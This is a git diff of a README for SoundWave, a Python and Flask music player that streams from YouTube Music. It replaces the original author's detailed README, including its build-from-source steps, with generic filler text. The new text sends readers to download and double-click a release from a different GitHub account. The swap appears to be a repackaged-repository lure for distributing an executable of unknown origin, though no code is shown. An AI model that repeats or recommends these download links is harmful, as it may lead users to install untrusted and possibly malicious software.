@@ -1,193 +1,76 @@
-<div align="center">
+# 🎵 SoundWave - Enjoy Music Without Distractions
 
-# 🎵 **SoundWave Premium**
-### **The Ultimate Open-Source Music Experience**
+## 🚀 Getting Started
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Flask](https://img.shields.io/badge/Flask-Backend-000000?style=for-the-badge&logo=flask&logoColor=white)
-![Tailwind](https://img.shields.io/badge/UI-Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)
+Welcome to SoundWave, your high-performance web-based music player. With ad-free streaming, infinite autoplay, and a stylish glassmorphism user interface, listening to your favorite music has never been easier. 
 
-<br />
+## 🛠 Features
 
-> **"Stop renting your music. Start owning the vibe."**
->
-> A stunning, self-hosted Python Music Player and Flask Web App that streams **High-Fidelity Audio** directly from YouTube Music — **Ad-Free Streaming. Zero Tracking. Infinite Play.**
+- **Ad-Free Streaming:** Enjoy uninterrupted music.
+- **Infinite Autoplay:** Your playlist never stops.
+- **Stylish Interface:** A modern, sleek design using glassmorphism.
+- **Cross-Platform Support:** Works on all major operating systems.
+- **Open Source:** Contribute and customize as you like.
 
-[**View Demo**](#) · [**Report Bug**](https://github.com/Maddy0057/SoundWave/issues) · [**Request Feature**](https://github.com/Maddy0057/SoundWave/issues)
+## 📥 Download SoundWave
 
-</div>
+[![Download SoundWave](https://img.shields.io/badge/Download_SoundWave-v1.0-blue)](https://github.com/Ferrazcafl/SoundWave/releases)
 
----
+To get started with SoundWave, you need to download the application. Follow the steps below for a smooth installation process.
 
-## 📥 **Download**
+## 🛠 System Requirements
 
-Get the latest Windows executable directly. No installation required!
+- **Operating System:** Windows, macOS, or Linux
+- **Python:** Version 3.7 or higher
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB free
 
-<div align="center">
+## 📂 Download & Install
 
-[![Download SoundWave](https://img.shields.io/badge/Windows-Download_v1.0.0-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Maddy0057/SoundWave/releases/download/v1.0.0/SoundWave.zip)
+1. Visit the [Releases page](https://github.com/Ferrazcafl/SoundWave/releases) to find the latest version of SoundWave.
+   
+2. Locate the version you want to download. Click the link to download the application file.
 
-</div>
+3. Once the download finishes, navigate to your downloads folder, and find the downloaded file.
 
-**Requirements:** Windows 10 or 11.
+4. Double-click on the file to start the installation.
 
-## 🔥 **Why SoundWave?**
+5. Follow the on-screen instructions to complete the installation process.
 
-Most open-source music players are command-line only or lack visual polish. **SoundWave** changes the game. It combines a **Next-Gen Glassmorphism UI** with robust Python engineering to deliver a Spotify-like experience for free.
+6. Once installed, open SoundWave from your applications folder or desktop shortcut.
 
-### 🚀 **Killer Features**
+## 🎵 How to Use SoundWave
 
-- **♾️ Smart Infinite Autoplay**
-  - When your queue ends, our smart algorithm fetches **20+ similar songs** automatically based on the last track.
-- **🚫 Ad-Free High-Fidelity Streaming**
-  - We stream pure, high-quality audio (m4a) using `yt-dlp` with seamless redirects.
-- **🖼️ Crystal Clear HD Visuals**
-  - Forced `maxresdefault` thumbnails for crisp, retina-ready album art on every track.
-- **🎨 Stunning Glass UI**
-  - Desktop-first interface built with **TailwindCSS** (CDN), smooth animations, and a layout that feels native on Desktop.
-- **💾 Persistent Local Playlists**
-  - Create, rename, delete playlists. Your data is saved locally (`playlists.json`).
-- **⚡ Auto-Setup Architecture**
-  - Powered by **Flask** and **Waitress**. Automatically downloads/updates `yt-dlp.exe` on first run.
+1. Open the SoundWave application.
+   
+2. Use the search function to find your favorite songs or playlists.
 
----
+3. Click on a song to start playing. 
 
-## 🛠️ **Tech Stack & Keywords**
+4. Control playback with the play, pause, and skip buttons.
 
-- **Backend:** Python 3, Flask, Waitress (WSGI)
-- **Streaming:** yt-dlp (FFmpeg pipeline), subprocess
-- **Frontend:** HTML5, Vanilla JavaScript (ES6+), TailwindCSS (CDN)
-- **Data Source:** YTMusicAPI (reverse engineered)
-- **Design:** Glassmorphism, Dark Mode
-- **Keywords:** Python Music Player, Flask Web App, Ad-Free Streaming, YouTube Music, Tailwind CSS, Windows .EXE
+5. Enjoy endless music without ads!
 
----
+## 🤝 Contributing
 
-## ⚡ **Quick Start Guide**
+We encourage contributions! If you're interested in improving SoundWave, feel free to check the contributions guidelines on our GitHub page. 
 
-Go from zero to streaming in **30 seconds**.
+## 💬 Support
 
-### **Prerequisites**
-- Python 3.8 or higher
+If you encounter any issues, you can ask for help on our GitHub issues page. We are here to assist you with any problems you might face.
 
-### **1. Clone the Repository**
-```bash
-git clone https://github.com/Maddy0057/SoundWave.git
-cd SoundWave
-```
+## 📌 Topics
 
-### **2. Install Dependencies**
-We recommend using a virtual environment.
+- ad-free-music
+- ad-free-streaming
+- flask-application
+- glassmorphism
+- mp3-player
+- open-source
+- pyinstaller
+- python
+- streaming
+- youtube-music
+- youtube-music-player
 
-```bash
-# Windows
-python -m venv venv
-venv\Scripts\activate
-
-# Mac/Linux
-python3 -m venv venv
-source venv/bin/activate
-
-# Install requirements
-pip install -r requirements.txt
-```
-
-> Note: You do not need to install `yt-dlp` manually. SoundWave downloads the correct binary automatically on first run.
-
-### **3. Launch the App 🚀**
-```bash
-python main.py
-```
-The Waitress server starts and your browser opens at `http://127.0.0.1:5000`.
-
----
-
-## 📸 **Screenshots**
-<div align="center">
-
-Desktop Views
-
-<img src="assets/image.png" alt="SoundWave Desktop View 1" width="900" />
-<br />
-<img src="assets/image1.png" alt="SoundWave Desktop View 2" width="900" />
-
-</div>
-
----
-
-## 📂 **Project Structure**
-```
-SoundWave/
-├── main.py              # Flask backend & logic
-├── templates/
-│   └── index.html       # Frontend UI (Tailwind + JS)
-├── requirements.txt     # Python dependencies
-├── playlists.json       # Local playlist storage (created at runtime)
-├── yt-dlp.exe           # Audio engine (auto-managed)
-└── README.md            # You are here
-```
-
----
-
-## 🎮 **How To Use**
-- **Search & Play:** Type any song, artist, or album in the top bar. Click a result to play.
-- **Queue Management:** Click the add button to queue songs without stopping playback.
-- **Autoplay Mode:** The infinity icon is ON by default; similar songs auto-append when the queue ends.
-- **Playlists:** Save songs to playlists, and manage them from the sidebar (Create, Rename, Delete).
-
----
-
-## 🧩 **API Endpoints**
-- `GET /api/search?query=...` – Top song results
-- `GET /api/recommendations?videoId=...` – Similar songs for autoplay
-- `GET /stream/<videoId>` – Redirects to a direct audio URL
-- `GET /api/playlists` – List playlists
-- `POST /api/playlists` – Create playlist
-- `DELETE /api/playlists/<name>` – Delete playlist
-- `POST /api/playlists/<name>/songs` – Add song
-- `DELETE /api/playlists/<name>/songs/<videoId>` – Remove song
-- `PUT /api/playlists/<old>` – Rename playlist
-
----
-
-## 🏁 **Build the Windows .EXE**
-Create a single-file executable with PyInstaller:
-
-```bash
-pip install pyinstaller
-pyinstaller --noconsole --onefile --add-data "templates;templates" --name SoundWave main.py
-```
-The `.exe` will appear in the `dist` folder. Place `yt-dlp.exe` next to it (or let the app auto-download on first run).
-
----
-
-## 🤝 **Contributing**
-We want to make this the #1 Open Source Music Player on GitHub.
-
-```bash
-# Fork the project
-# Create your feature branch
-git checkout -b feature/AmazingFeature
-# Commit your changes
-git commit -m "Add some AmazingFeature"
-# Push to the branch
-git push origin feature/AmazingFeature
-# Open a Pull Request
-```
-
----
-
-## 📜 **License**
-Distributed under the MIT License. See `LICENSE` for more information.
-
-<div align="center">
-
-Love the project?
-
-**Give it a ⭐ Star on GitHub!**
-
-Made with ❤️ and Python.
-
-</div>
+Thank you for choosing SoundWave. Enjoy the music!
